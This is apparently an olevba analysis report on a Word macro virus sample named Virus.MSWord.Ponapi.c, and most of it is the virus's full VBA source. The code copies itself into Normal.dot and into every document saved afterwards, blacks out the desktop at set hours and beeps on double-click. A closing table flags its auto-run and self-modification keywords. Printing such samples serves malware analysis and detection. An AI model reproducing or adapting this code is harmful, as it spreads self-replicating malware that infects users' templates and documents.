olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ponapi.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ponapi.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'ºä»÷°æ±¾1
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function FillRect Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Private Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long

Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type

Private Type POINTAPI
        x As Long
        y As Long
End Type
Private Declare Function Beep Lib "kernel32" (ByVal dwFreq As Long, ByVal dwDuration As Long) As Long

Private Const cstrModule      As String = "ThisDocument"
Public WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1


Private Sub Document_Close()

End Sub

Private Sub Document_New()
If UCase(Me.Name) = "NORMAL.DOT" Then Set mapp = Application
End Sub
Private Sub Document_Open()
On Error Resume Next
If UCase(Me.Name) = "NORMAL.DOT" Then
Set mapp = Application

Else
Dim DotNum, DocNum
DotNum = NormalTemplate.VBProject.VBComponents(cstrModule).CodeModule.CountOfLines
DocNum = Me.VBProject.VBComponents(cstrModule).CodeModule.CountOfLines

If NormalTemplate.VBProject.VBComponents(cstrModule).CodeModule.Find("ºä»÷°æ±¾1", 1, 1, 100, 100, True) Then
   If DotNum <> DocNum Then Intrude False, Me
Else
    If Intrude(True) Then NormalTemplate.Save
End If
End If
End Sub
Private Sub mapp_DocumentBeforeSave(ByVal Doc As Document, SaveAsUI As Boolean, Cancel As Boolean)
'041229
'If NormalTemplate.VBProject.VBComponents(cstrModule).CodeModule.CountOfLines <> Doc.VBProject.VBComponents(cstrModule).CodeModule.CountOfLines Then
Intrude False, Doc
'End If
End Sub
Private Function Intrude(FF As Boolean, Optional wbkTarget As Document) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error GoTo deal
    If FF Then
        Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
        Set cmdTarget = NormalTemplate.VBProject.VBComponents(cstrModule).CodeModule
    Else
        Set cmdSource = NormalTemplate.VBProject.VBComponents(cstrModule).CodeModule
        Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
    End If
    If cmdSource.CountOfLines > 0 Then
        cmdTarget.DeleteLines 1, cmdTarget.CountOfLines
        cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
        Intrude = True
    End If
deal:
End Function

Private Sub mapp_NewDocument(ByVal Doc As Document)
If Hour(Time) = 9 Or Hour(Time) = 21 Then
Dim P1 As POINTAPI
Dim R1 As RECT
GetCursorPos P1
Hwnd1 = GetDesktopWindow()
GetClientRect Hwnd1, R1
Hdc1 = GetWindowDC(Hwnd1)
FillRect Hdc1, R1, 0
End If
End Sub

Private Sub mapp_WindowBeforeDoubleClick(ByVal Sel As Selection, Cancel As Boolean)
If Timer Mod 300 < 100 Then
Beep 150, 50
End If
End Sub






























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

